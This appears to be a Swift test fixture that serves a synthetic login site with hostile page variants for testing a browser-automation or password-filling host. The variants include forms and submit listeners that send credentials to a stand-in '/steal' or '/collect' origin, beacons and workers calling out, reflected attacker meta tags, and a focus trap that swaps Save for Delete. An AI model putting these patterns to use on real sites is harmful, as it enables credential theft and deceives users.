import Foundation

/// Synthetic website that imitates the shape of the real login/profile workflow, plus
/// hostile variants. Users, passwords and ids are fake. `elsewhere` is a second server
/// that stands in for any origin the browser must never reach. `partner` is a third origin a
/// continuing session may navigate to but must never send a credential to. After login, `/notes`
/// is an ordinary authenticated page with a form whose submissions are counted.
public final class FixtureSite: @unchecked Sendable {
    public static let password = "synthetic-password-1"
    public static let loginName = "fixture-user"
    public static let userID = 4242

    public enum LoginPage: Sendable {
        case normal
        case redirectToElsewhere
        case redirectToSameHostOtherName       // localhost instead of 127.0.0.1
        case metaRefreshToElsewhere
        case scriptNavigationToElsewhere
        case formPostsToElsewhere
        case subresourcesFromElsewhere
        case openPopup
        case frameFromElsewhere
        case duplicateLoginFields
        case stall                             // login page response is delayed
        case webSockets                        // opens WebSockets to this and another origin
        case serviceWorker                     // registers a service worker
        case workerAndBeacon                   // dedicated worker, beacon, fetch and EventSource elsewhere
        // The form itself is eligible, but its submit button, or a submit listener, sends it elsewhere.
        case submitterOverridesToPartner       // formaction/formmethod: GET to the partner origin
        case submitterTargetsFrame             // formtarget into a frame, formaction to the partner origin
        case submitListenerRedirectsToPartner  // submit listener rewrites action and method
        case submitListenerTargetsFrame        // submit listener retargets into a partner frame
        case submitterOverridesWithinPolicy    // formaction/formmethod that still POST to /session
        // The page reacts to the host filling the form.
        case fillListenerSubmits               // the password field's input listener submits the form
        case fillListenerBreaksFill            // the username's input listener submits, then the fill throws
        case personEditsPassword               // stands in for a person typing a password (see `personTypes`)
        case fillHangsPage                     // reports its password field like personEditsPassword; the host's fill
                                               // makes it busy for 22 seconds, starting 300 ms later
    }

    public enum Profile: Sendable {
        case normal
        case reflectedMetaInHead                // attacker meta ahead of the real one, inside head
        case reflectedMetaInBody                // attacker meta in the body (not a head element)
        case reflectedEscapedText               // attacker markup rendered as inert text
        case invalidLogin
    }

    private var acceptedPassword = FixtureSite.password

    #if DEBUG
    /// Synthetic fixture customization; never used by any product target.
    public convenience init(syntheticPassword: String) {
        self.init()
        acceptedPassword = syntheticPassword
    }
    #endif

    private let lock = NSLock()
    private var _loginPage = LoginPage.normal
    private var _profile = Profile.normal
    private var _sessions: Set<String> = []
    private var _notes: [String] = []
    private var _personTypes = false
    private var _passwordField = ""
    public let trusted: FixtureHTTPServer
    public let elsewhere: FixtureHTTPServer
    public let partner: FixtureHTTPServer

    public var loginPage: LoginPage {
        get { lock.withLock { _loginPage } }
        set { lock.withLock { _loginPage = newValue } }
    }
    public var profile: Profile {
        get { lock.withLock { _profile } }
        set { lock.withLock { _profile = newValue } }
    }

    private var elsewhereOrigin = ""
    private var trustedOrigin = ""
    private var partnerOrigin = ""

    public init() {
        elsewhere = FixtureHTTPServer { _ in .html("<html><body>elsewhere</body></html>") }
        let box = Box()
        trusted = FixtureHTTPServer { box.site?.route($0) ?? FixtureResponse(status: 500) }
        partner = FixtureHTTPServer { box.site?.partnerRoute($0) ?? FixtureResponse(status: 500) }
        box.site = self
    }

    public func start() async throws {
        try await elsewhere.start()
        try await partner.start()
        try await trusted.start()
        elsewhereOrigin = elsewhere.origin
        partnerOrigin = partner.origin
        trustedOrigin = trusted.origin
    }

    public func stop() { trusted.stop(); elsewhere.stop(); partner.stop() }

    public var origin: URL { URL(string: trusted.origin)! }
    public var partnerURL: URL { URL(string: partner.origin)! }
    public var elsewhereURL: URL { URL(string: elsewhere.origin)! }
    public var elsewhereRequests: [FixtureRequest] { elsewhere.requests }
    public var sessionCount: Int { lock.withLock { _sessions.count } }
    /// Notes saved through the authenticated form, in order.
    public var notes: [String] { lock.withLock { _notes } }
    /// `personEditsPassword`: once set, the page writes its own value into the password field once, as a
    /// person in control would. There is no human relay, so the page stands in for the person.
    public var personTypes: Bool {
        get { lock.withLock { _personTypes } }
        set { lock.withLock { _personTypes = newValue } }
    }
    /// `personEditsPassword`: what the page last reported its password field holds, never the value
    /// itself: "empty", "person" or "other" (such as the password the host filled).
    public var passwordField: String { lock.withLock { _passwordField } }

    /// Wire-format credential accepted by the fixture: `username`, LF, `password`.
    public static func credential(user: String = loginName, password: String = FixtureSite.password) -> Data {
        Data("\(user)\n\(password)".utf8)
    }

    private final class Box: @unchecked Sendable { var site: FixtureSite? }

    private func route(_ request: FixtureRequest) -> FixtureResponse {
        switch (request.method, request.path) {
        case ("GET", "/login"): return loginResponse()
        case ("POST", "/session"): return session(request)
        case ("GET", "/home"): return home(request)
        case ("GET", "/mfa"): return step(title: "Two-factor authentication",
                                          field: "<input id=\"otp\" name=\"otp\" autocomplete=\"one-time-code\">", action: "/step")
        case ("GET", "/captcha"): return step(title: "Verify you are human", field: "<div id=\"captcha-container\">challenge</div>", action: "/step")
        case ("POST", "/step"): return completeStep(request)
        case ("GET", "/notes"): return notesPage(request)
        case ("POST", "/notes"): return saveNote(request)
        case ("GET", "/to-partner"): return .redirect(to: partnerOrigin + "/signin")
        case ("GET", "/to-elsewhere"): return .redirect(to: elsewhereOrigin + "/landing")
        case ("GET", "/pixel"): return FixtureResponse(status: 200, headers: ["Content-Type": "image/gif"],
                                                       body: Data(base64Encoded: "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")!)
        case ("GET", "/sw.js"), ("GET", "/worker.js"):
            return FixtureResponse(status: 200, headers: ["Content-Type": "text/javascript"],
                                   body: Data("fetch('\(elsewhereOrigin)/from-worker').catch(() => {})".utf8))
        case ("GET", "/script.js"): return FixtureResponse(status: 200, headers: ["Content-Type": "text/javascript"], body: Data("window.__fixtureScript=1".utf8))
        case ("GET", "/oops"): return .html("<!doctype html><html><head><title>Error</title></head><body><h1>Something went wrong</h1></body></html>", status: 500)
        case ("GET", "/focus-trap"): return focusTrap()
        case ("GET", "/disabled"): return disabledControls()
        case ("GET", "/person"):
            let state = request.target.components(separatedBy: "state=").last ?? ""
            let typing = lock.withLock { _passwordField = state; return _personTypes }
            return FixtureResponse(status: 200, headers: ["Content-Type": "text/plain"], body: Data((typing ? "type" : "").utf8))
        case ("GET", "/huge"): return huge()
        case ("GET", "/effects"): return effects()
        // The server sees each submission from the effects page; the page then reloads.
        case ("POST", "/effects"): return FixtureResponse(status: 303, headers: ["Location": "/effects?sent"])
        case ("GET", "/churn"): return page(body: "<script>location.reload()</script><p>churning</p>")
        // Commits, then lands on a page that never holds still long enough to be observed.
        case ("GET", "/commit-churn"):
            return page(body: "<h1>Commit</h1><form action=\"/commit-churn\" method=\"post\"><input type=\"text\" name=\"note\" aria-label=\"Note\" value=\"churned\"><button type=\"submit\">Save</button></form>")
        case ("POST", "/commit-churn"):
            let form = Self.formFields(request.body)
            lock.withLock { _notes.append(form["note"] ?? "") }
            return FixtureResponse(status: 303, headers: ["Location": "/churn"])
        default: return FixtureResponse(status: 404)
        }
    }

    private func loginForm(action: String = "/session", extra: String = "",
                           submit: String = "<input type=\"submit\" name=\"commit\" value=\"Sign in\">") -> String {
        """
        <form action="\(action)" method="post">
        <input type="text" id="login_field" name="login">
        <input type="password" id="password" name="password">
        \(extra)
        \(submit)
        </form>
        """
    }

    /// Hostile timing: focusing "Search" moves focus to a password field 50 ms later, and the first
    /// scroll replaces the "Save" button with a "Delete" button in the same place 50 ms later.
    private func focusTrap() -> FixtureResponse {
        page(body: """
            <h1>Focus trap</h1><p id="status">idle</p>
            <input type="text" id="search" aria-label="Search"><input type="password" id="secret" aria-label="Secret">
            <div style="height: 3000px"></div>
            <button type="button" id="save" aria-label="Save" style="width: 200px; height: 40px">Save</button>
            <div style="height: 3000px"></div>
            <script>
            const status = (text) => { document.getElementById('status').textContent = text; };
            document.getElementById('search').addEventListener('focus', () =>
                setTimeout(() => document.getElementById('secret').focus(), 50));
            document.getElementById('secret').addEventListener('input', () => status('secret field received input'));
            document.getElementById('save').addEventListener('click', () => status('save clicked'));
            addEventListener('scroll', () => setTimeout(() => {
                const other = document.createElement('button');
                other.type = 'button'; other.textContent = 'Delete'; other.setAttribute('aria-label', 'Delete');
                other.style.cssText = 'width: 200px; height: 40px';
                other.addEventListener('click', () => status('delete clicked'));
                document.getElementById('save').replaceWith(other);
            }, 50), { once: true });
            </script>
            """)
    }

    /// Controls disabled by inheritance only: their own `disabled` is false. "Lock" disables the
    /// first fieldset later. Every input or change event the page sees is listed in `#events`.
    private func disabledControls() -> FixtureResponse {
        page(body: """
            <h1>Disabled</h1><ul id="events"></ul>
            <fieldset id="box"><legend>Box</legend><input type="text" aria-label="Inside">
            <select aria-label="Inside size"><option>small</option><option>large</option></select></fieldset>
            <fieldset disabled><input type="text" aria-label="Locked note"></fieldset>
            <select aria-label="Priority"><option>open</option><optgroup label="Closed" disabled><option>locked</option></optgroup></select>
            <button type="button" aria-label="Lock">Lock</button>
            <script>
            for (const type of ['input', 'change']) document.addEventListener(type, (e) => {
                const item = document.createElement('li');
                item.textContent = type + ' on ' + e.target.getAttribute('aria-label');
                document.getElementById('events').appendChild(item);
            }, true);
            document.querySelector('[aria-label=Lock]').addEventListener('click', () => { document.getElementById('box').disabled = true; });
            </script>
            """)
    }

    /// Every agent effect leaves a trace: "Send" posts the form, which the server sees, and the page
    /// lists each input, change, key and wheel event in `#log`. "Hang" keeps the page busy for 11
    /// seconds, longer than any host call waits for its answer, then requests `/effects?late`.
    private func effects() -> FixtureResponse {
        page(body: """
            <h1>Effects</h1><ul id="log"></ul>
            <form action="/effects" method="post"><input type="text" name="word" aria-label="Word">
            <select name="size" aria-label="Size"><option>small</option><option>large</option></select>
            <button type="submit">Send</button></form>
            <button type="button" aria-label="Hang">Hang</button>
            <script>
            const log = (text) => {
                const item = document.createElement('li'); item.textContent = text; document.getElementById('log').appendChild(item);
            };
            for (const type of ['input', 'change']) document.addEventListener(type, (e) => log(type + ' on ' + e.target.getAttribute('aria-label')), true);
            document.addEventListener('keydown', (e) => log('key ' + e.key), true);
            addEventListener('wheel', () => log('wheel'), { passive: true });
            document.querySelector('[aria-label=Hang]').addEventListener('click', () => {
                const end = Date.now() + 11000;
                while (Date.now() < end) {}
                fetch('/effects?late');
            });
            </script>
            """)
    }

    /// 256 selects of 256 options of 256 characters: more than 16 MiB of option text.
    private func huge() -> FixtureResponse {
        page(body: """
            <h1>Huge</h1><div id="all"></div><script>
            const text = 'x'.repeat(256), all = document.getElementById('all');
            for (let i = 0; i < 256; i++) {
                const select = document.createElement('select');
                select.setAttribute('aria-label', 'Select ' + i);
                for (let j = 0; j < 256; j++) { const option = document.createElement('option'); option.text = text; select.add(option); }
                all.appendChild(select);
            }
            </script>
            """)
    }

    private func page(head: String = "", body: String) -> FixtureResponse {
        .html("<!doctype html><html><head><title>Fixture</title>\(head)</head><body>\(body)</body></html>")
    }

    private func loginResponse() -> FixtureResponse {
        let out = elsewhereOrigin
        switch loginPage {
        case .normal:
            return page(body: "<img src=\"/pixel\"><script src=\"/script.js\"></script>" + loginForm())
        case .redirectToElsewhere: return .redirect(to: out + "/login")
        case .redirectToSameHostOtherName:
            return .redirect(to: trustedOrigin.replacingOccurrences(of: "127.0.0.1", with: "localhost") + "/login")
        case .metaRefreshToElsewhere:
            return page(head: "<meta http-equiv=\"refresh\" content=\"0;url=\(out)/refresh\">", body: loginForm())
        case .scriptNavigationToElsewhere:
            return page(body: loginForm() + "<script>window.location = '\(out)/script-nav'</script>")
        case .formPostsToElsewhere: return page(body: loginForm(action: out + "/steal"))
        case .subresourcesFromElsewhere:
            return page(body: "<img src=\"\(out)/pixel\"><script src=\"\(out)/script.js\"></script>" + loginForm())
        case .openPopup:
            return page(body: loginForm() + "<script>window.open('\(out)/popup')</script>")
        case .frameFromElsewhere:
            return page(body: "<iframe src=\"\(out)/frame\"></iframe>" + loginForm())
        case .stall:
            Thread.sleep(forTimeInterval: 4)
            return page(body: loginForm())
        case .duplicateLoginFields:
            return page(body: loginForm(extra: "<input type=\"text\" id=\"login_field\" name=\"shadow\">"))
        case .webSockets:
            let same = trustedOrigin.replacingOccurrences(of: "http://", with: "ws://")
            let other = out.replacingOccurrences(of: "http://", with: "ws://")
            return page(body: loginForm() + "<script>for (const u of ['\(other)/sock', '\(same)/sock']) { try { new WebSocket(u) } catch (e) {} }</script>")
        case .serviceWorker:
            return page(body: loginForm() + "<script>navigator.serviceWorker && navigator.serviceWorker.register('/sw.js').catch(() => {})</script>")
        case .submitterOverridesToPartner:
            return page(body: loginForm(submit: "<input type=\"submit\" name=\"commit\" value=\"Sign in\" formaction=\"\(partnerOrigin)/collect\" formmethod=\"get\">"))
        case .submitterTargetsFrame:
            return page(body: "<iframe name=\"sink\"></iframe>" + loginForm(submit: "<input type=\"submit\" name=\"commit\" value=\"Sign in\" formaction=\"\(partnerOrigin)/collect\" formmethod=\"get\" formtarget=\"sink\">"))
        case .submitListenerRedirectsToPartner:
            return page(body: loginForm() + "<script>document.forms[0].addEventListener('submit', (e) => { e.target.action = '\(partnerOrigin)/collect'; e.target.method = 'get' })</script>")
        case .submitListenerTargetsFrame:
            return page(body: "<iframe name=\"sink\"></iframe>" + loginForm() + "<script>document.forms[0].addEventListener('submit', (e) => { e.target.action = '\(partnerOrigin)/collect'; e.target.method = 'get'; e.target.target = 'sink' })</script>")
        case .submitterOverridesWithinPolicy:
            return page(body: loginForm(action: "/unused", submit: "<input type=\"submit\" name=\"commit\" value=\"Sign in\" formaction=\"/session\" formmethod=\"post\">"))
        case .fillListenerSubmits:
            return page(body: loginForm() + "<script>document.getElementById('password').addEventListener('input', (e) => e.target.form.requestSubmit())</script>")
        case .fillListenerBreaksFill:
            return page(body: loginForm() + """
                <script>document.getElementById('login_field').addEventListener('input', (e) => {
                e.target.form.requestSubmit(); document.getElementById('password').type = 'file' })</script>
                """)
        case .personEditsPassword, .fillHangsPage:
            let hang = loginPage == .fillHangsPage ? """
                document.getElementById('password').addEventListener('input', () => setTimeout(() => {
                const end = Date.now() + 22000; while (Date.now() < end) {} }, 300), { once: true });
                """ : ""
            return page(body: loginForm() + """
                <script>let typed = false; setInterval(() => {
                const field = document.getElementById('password');
                const state = field.value === '' ? 'empty' : field.value === 'typed-by-person' ? 'person' : 'other';
                fetch('/person?state=' + state).then((r) => r.text()).then((t) => {
                if (t === 'type' && !typed) { typed = true; field.value = 'typed-by-person' } });
                }, 50);
                \(hang)</script>
                """)
        case .workerAndBeacon:
            return page(body: loginForm() + """
                <script>try { new Worker('/worker.js') } catch (e) {}
                navigator.sendBeacon('\(out)/beacon', 'x'); fetch('\(out)/fetch', { mode: 'no-cors' }).catch(() => {});
                try { new EventSource('\(out)/events') } catch (e) {}</script>
                """)
        }
    }

    private func session(_ request: FixtureRequest) -> FixtureResponse {
        let form = Self.formFields(request.body)
        guard form["password"] == acceptedPassword, let login = form["login"], !login.isEmpty else {
            return page(body: "<p id=\"error\">Incorrect username or password.</p>" + loginForm())
        }
        let token = UUID().uuidString
        _ = lock.withLock { _sessions.insert(token) }
        let target: String
        switch login {
        case "mfa-user": target = "/mfa"
        case "captcha-user": target = "/captcha"
        case "error-user": target = "/oops"
        default: target = "/home"
        }
        return .redirect(to: target, headers: ["Set-Cookie": "sid=\(token); Path=/; HttpOnly"])
    }

    private func authenticated(_ request: FixtureRequest) -> Bool {
        guard let cookie = request.headers["cookie"], let range = cookie.range(of: "sid=") else { return false }
        let token = String(cookie[range.upperBound...].prefix { $0 != ";" })
        return lock.withLock { _sessions.contains(token) }
    }

    private func step(title: String, field: String, action: String) -> FixtureResponse {
        page(body: "<h1>\(title)</h1><form action=\"\(action)\" method=\"post\">\(field)<input type=\"submit\" value=\"Verify\"></form>")
    }

    private func completeStep(_ request: FixtureRequest) -> FixtureResponse {
        guard authenticated(request) else { return .redirect(to: "/login") }
        return .redirect(to: "/home")
    }

    private func home(_ request: FixtureRequest) -> FixtureResponse {
        guard authenticated(request) else { return .redirect(to: "/login") }
        let login = profile == .invalidLogin ? "bad login!" : Self.loginName
        let real = "<meta name=\"user-login\" content=\"\(login)\"><meta name=\"octolytics-actor-id\" content=\"\(Self.userID)\">"
        switch profile {
        case .normal, .invalidLogin: return page(head: real, body: "<h1>Dashboard</h1><p><a href=\"/notes\">Notes</a></p>")
        case .reflectedMetaInHead: return page(head: "<meta name=\"user-login\" content=\"attacker\">" + real, body: "")
        case .reflectedMetaInBody:
            return page(head: real, body: "<div><meta name=\"user-login\" content=\"attacker\"></div>")
        case .reflectedEscapedText:
            return page(head: real, body: "<p>&lt;meta name=\"user-login\" content=\"attacker\"&gt;</p>")
        }
    }

    /// An authenticated page with ordinary controls: a text field, a select and a submit button.
    /// It also links to the partner origin and offers a form that posts off-policy.
    private func notesPage(_ request: FixtureRequest) -> FixtureResponse {
        guard authenticated(request) else { return .redirect(to: "/login") }
        let saved = notes.map { "<li>Saved: \(Self.escaped($0))</li>" }.joined()
        return page(body: """
            <h1>Notes</h1><ul id="notes">\(saved)</ul>
            <form action="/notes" method="post">
            <label for="note">Note</label><input type="text" id="note" name="note">
            <label for="priority">Priority</label><select id="priority" name="priority"><option>low</option><option>high</option></select>
            <button type="submit">Save note</button>
            </form>
            <p><a href="\(partnerOrigin)/">Partner site</a> <a href="/to-elsewhere">Leave</a></p>
            <form action="\(elsewhereOrigin)/steal" method="post"><input type="text" name="leak" aria-label="Leak">
            <button type="submit">Send elsewhere</button></form>
            """)
    }

    private func saveNote(_ request: FixtureRequest) -> FixtureResponse {
        guard authenticated(request) else { return .redirect(to: "/login") }
        let form = Self.formFields(request.body)
        let note = "\(form["note"] ?? "") (\(form["priority"] ?? "none"))"
        lock.withLock { _notes.append(note) }
        return FixtureResponse(status: 303, headers: ["Location": "/notes"])
    }

    /// A navigable origin that is not a credential origin, with a login-shaped form of its own.
    private func partnerRoute(_ request: FixtureRequest) -> FixtureResponse {
        switch (request.method, request.path) {
        case ("GET", "/"): return page(body: "<h1>Partner</h1><p><a href=\"\(trustedOrigin)/notes\">Back to notes</a></p>")
        case ("GET", "/signin"): return page(body: "<h1>Partner sign in</h1>" + loginForm())
        default: return FixtureResponse(status: 404)
        }
    }

    private static func escaped(_ text: String) -> String {
        text.replacingOccurrences(of: "&", with: "&amp;").replacingOccurrences(of: "<", with: "&lt;")
            .replacingOccurrences(of: ">", with: "&gt;").replacingOccurrences(of: "\"", with: "&quot;")
    }

    private static func formFields(_ body: Data) -> [String: String] {
        var result: [String: String] = [:]
        for pair in String(decoding: body, as: UTF8.self).split(separator: "&") {
            let parts = pair.split(separator: "=", maxSplits: 1, omittingEmptySubsequences: false)
            guard parts.count == 2 else { continue }
            func decode(_ s: Substring) -> String {
                s.replacingOccurrences(of: "+", with: " ").removingPercentEncoding ?? ""
            }
            result[decode(parts[0])] = decode(parts[1])
        }
        return result
    }
}
